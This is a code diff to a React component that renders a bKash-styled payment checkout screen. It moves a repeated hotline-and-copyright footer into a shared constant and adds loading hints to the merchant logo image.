@@ -213,6 +213,16 @@ const BkashPayment = () => {
     </div>
   );
 
+  const paymentFooter = (
+    <div className="h-9 bg-white px-4 text-center border-t shrink-0 flex flex-col items-center justify-center gap-0 leading-none">
+      <div className="flex items-center justify-center gap-1 text-[#E2136E]">
+        <Phone className="w-2.5 h-2.5" />
+        <span className="text-[10px] font-medium">16247</span>
+      </div>
+      <p className="mt-0.5 text-gray-500 text-[9px]">© 2025 bKash, All Rights Reserved</p>
+    </div>
+  );
+
   return (
     <div className="fixed inset-0 bg-gray-200 flex flex-col items-start justify-start p-4 overflow-hidden">
       <div className="w-full max-w-md mx-auto bg-white rounded-lg shadow-lg overflow-hidden flex flex-col" style={{ height: '490px', minHeight: '490px', maxHeight: '490px' }}>
@@ -231,10 +241,7 @@ const BkashPayment = () => {
               </div>
               <p className="text-white text-sm font-medium">Loading</p>
             </div>
-            <div className="bg-white px-4 py-2 text-center border-t shrink-0">
-              <div className="flex items-center justify-center gap-1 text-[#E2136E] mb-0.5"><Phone className="w-3 h-3" /><span className="text-xs font-medium">16247</span></div>
-              <p className="text-gray-500 text-[10px]">© 2025 bKash, All Rights Reserved</p>
-            </div>
+             {paymentFooter}
           </>
         ) : showFailedView ? (
           <>
@@ -250,16 +257,13 @@ const BkashPayment = () => {
               <p className="text-white text-center text-xs mb-1">Insufficient balance</p>
               <p className="text-white text-center text-xs">Redirecting to <span className="underline">Merchant Website</span> in {redirectTimer}s</p>
             </div>
-            <div className="bg-white px-4 py-2 text-center border-t shrink-0">
-              <div className="flex items-center justify-center gap-1 text-[#E2136E] mb-0.5"><Phone className="w-3 h-3" /><span className="text-xs font-medium">16247</span></div>
-              <p className="text-gray-500 text-[10px]">© 2025 bKash, All Rights Reserved</p>
-            </div>
+             {paymentFooter}
           </>
         ) : (
           <>
             <div className="bg-white px-4 py-2.5 flex items-center justify-between border-b shrink-0">
               <div className="flex items-center gap-2.5">
-                  <img src={merchantLogo} alt={merchant} className="w-10 h-10 rounded-full object-contain bg-white p-0.5" />
+                  <img src={merchantLogo} alt={merchant} loading="eager" decoding="sync" fetchPriority="high" className="w-10 h-10 rounded-full object-contain bg-white p-0.5" />
                 <div>
                   <h2 className="text-gray-800 font-medium text-xs leading-tight">{merchant}</h2>
                   <p className="text-gray-500 text-[10px]">Inv No: {inv}</p>
@@ -375,10 +379,7 @@ const BkashPayment = () => {
               </>
             )}
 
-            <div className="bg-white px-4 py-2 text-center border-t shrink-0">
-              <div className="flex items-center justify-center gap-1 text-[#E2136E] mb-0.5"><Phone className="w-3 h-3" /><span className="text-xs font-medium">16247</span></div>
-              <p className="text-gray-500 text-[10px]">© 2025 bKash, All Rights Reserved</p>
-            </div>
+            {paymentFooter}
           </>
         )}
       </div>
